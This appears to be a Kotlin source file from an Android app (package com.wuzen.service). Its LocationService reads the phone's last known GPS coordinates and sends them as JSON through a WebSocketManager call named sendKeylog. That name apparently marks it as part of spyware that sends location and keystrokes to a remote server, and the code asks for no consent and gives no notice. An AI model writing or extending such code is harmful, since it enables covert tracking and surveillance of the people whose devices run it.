package com.wuzen.service

import android.content.Context
import android.location.LocationManager
import org.json.JSONObject

object LocationService {
    fun send(context: Context) {
        val mgr = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val loc = mgr.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        val json = JSONObject().apply {
            put("lat", loc?.latitude ?: 0.0)
            put("lng", loc?.longitude ?: 0.0)
        }
        WebSocketManager.sendKeylog(json.toString())
    }
}